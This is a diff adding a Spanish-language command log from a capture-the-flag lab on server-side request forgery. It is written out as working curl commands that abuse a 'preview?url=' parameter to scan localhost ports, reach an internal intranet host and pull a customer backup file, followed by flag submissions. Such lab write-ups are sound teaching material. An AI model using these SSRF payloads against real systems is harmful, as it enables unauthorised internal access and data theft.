@@ -1,0 +1,26 @@
+# Bitacora de comandos — Lab Extra SSRF — Grupo 05
+# Todos los comandos se corren desde la consola del atacante: `make shell`.
+# El atacante esta en labnet; la intranet vive en internalnet (sin ruta directa).
+
+## 0. Reconocimiento del alcance de red
+curl -s --max-time 5 http://phantomcorp/                 # portal publico: alcanzable
+curl -s --max-time 4 http://phantomcorp-intra/           # intranet: timeout/no resuelve (exit 6)
+
+## 1. R1 — SSRF a localhost (panel interno en 127.0.0.1)
+# Oraculo de escaneo: puerto cerrado vs abierto segun el mensaje de error.
+curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:9001/'   # Connection refused -> cerrado
+curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:8080/'   # Connection refused -> cerrado
+curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:9000/'   # 200 -> panel interno + FLAG R1
+
+## 2. R2 — SSRF a la red interna (descubrir la intranet)
+# El nombre interno sigue el patron de los otros labs: phantomcorp-intra.
+curl -s 'http://phantomcorp/preview?url=http://phantomcorp-intra/'            # FLAG R2 (Host)
+
+## 3. R3 — Exfiltracion del backup de clientes via SSRF
+curl -s 'http://phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json'  # FLAG R3
+
+## 4. Entrega de flags
+./ctf submit extra R1 'FLAG{ssrf_localhost_panel_interno}'
+./ctf submit extra R2 'FLAG{ssrf_intranet_descubierta}'
+./ctf submit extra R3 'FLAG{ssrf_backup_clientes}'
+./ctf status extra
